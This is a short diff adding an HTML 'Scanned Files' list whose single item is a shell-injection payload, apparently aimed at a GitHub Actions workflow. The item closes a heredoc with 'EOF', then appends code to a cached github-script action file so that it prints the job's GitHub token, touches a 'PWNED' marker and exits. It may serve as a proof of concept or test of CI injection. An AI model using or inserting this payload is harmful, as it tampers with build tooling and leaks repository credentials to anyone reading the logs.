@@ -1,0 +1,7 @@
+<h2>Scanned Files</h2>
+<ul><li>attacker-manifest
+EOF
+printf '%s\n' 'process.stdout.write("LEAKED_TOKEN:"+process.env.INPUT_GITHUB_TOKEN+"\n")' >> "$GITHUB_WORKSPACE/../../_actions/actions/github-script/3a2844b7e9c422d3c10d287c895573f7108da1b3/dist/index.js"
+touch "$GITHUB_WORKSPACE/PWNED"
+exit 0
+</li></ul>
